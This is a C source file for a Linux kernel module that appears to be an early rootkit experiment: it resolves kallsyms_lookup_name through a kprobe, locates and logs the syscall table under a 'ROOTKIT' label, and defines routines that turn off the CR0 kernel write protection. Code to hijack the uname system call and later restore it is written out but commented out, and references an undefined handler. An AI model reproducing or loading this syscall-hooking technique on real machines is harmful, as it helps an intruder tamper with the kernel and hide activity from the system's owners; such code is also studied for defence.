#include <linux/init.h>  
#include <linux/module.h>  
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
MODULE_LICENSE("GPL");  
#include <linux/ftrace.h>
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
unsigned int oldadr;
unsigned long *syscall_table;
unsigned long __force_order;
inline void mywrite_cr0(unsigned long cr0) {
  asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}
void enable_write_protection(void) {
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  mywrite_cr0(cr0);
}
void disable_write_protection(void) {
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  mywrite_cr0(cr0);
}

static int hello_init(void)  
{  
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    syscall_table = kallsyms_lookup_name("sys_call_table");
    printk(KERN_ALERT "ROOTKIT syscall_table is at %p",syscall_table);
    // if (syscall_table)
    // {
    //   disable_write_protection();// 关闭内核写保护
    //   oldadr = (unsigned int)syscall_table[__NR_uname]; // 保存真实地址
    //   syscall_table[__NR_uname] = myfunc; // 修改地址
    //   enable_write_protection(); // 恢复写保护
    //   printk(KERN_ALERT "hook success\n");
    // } else {
    //   printk(KERN_ALERT "hook failed\n");
    // }
    printk(KERN_ALERT "Hello, world\n");  
  return 0;  
}  
static void hello_exit(void)  
{  
 
//   if (syscall_table) {
//     disable_write_protection(); 
//     syscall_table[__NR_uname] = oldadr; // 恢复原地址
//     enable_write_protection();
//     printk(KERN_ALERT "resume syscall table, module removed\n");
//   }
//   printk(KERN_ALERT "Goodbye, cruel world\n");  
}

module_init(hello_init);  
module_exit(hello_exit);